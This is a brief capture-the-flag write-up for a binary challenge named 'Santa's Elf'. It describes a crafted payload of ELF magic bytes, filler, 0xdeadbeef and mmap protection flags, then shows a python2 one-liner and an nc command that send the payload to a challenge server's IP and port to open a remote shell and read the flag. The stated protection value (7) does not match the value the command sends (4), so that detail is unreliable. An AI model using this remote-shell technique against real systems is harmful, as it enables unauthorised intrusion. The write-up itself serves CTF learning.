### Santa's Elf

Flag: ACS_IXIA_CTF{not_the_elf_you_were_thinking_about}

The payload is the following:
- 4 bytes from DAT_00100ad8 (ELF header, 0x00-0x03);
- 20 random bytes (0x04 - 0x17);
- 0x0000deadbeef (0x18 - 0x1f);
- 16 random bytes (0x20 - 0x2f);
- 7 (PROT_EXEC|PROT_WRITE|PROT_READ for mmap, 0x30 - 0x39).

Then build the payload and send it to the server in order to open a remote shell:
```
python2 -c 'print "\x7f\x45\x4c\x46" + "A" * 20 + "\xef\xbe\xad\xde" + "\x00" * 4 + "A" * 16 + "\x04\x00\x00\x00"' > payload
cat payload - | nc 141.85.224.118 31337
cat /home/ctf/flag
ACS_IXIA_CTF{not_the_elf_you_were_thinking_about}
```

[Back](../../ixia_ctf.md)
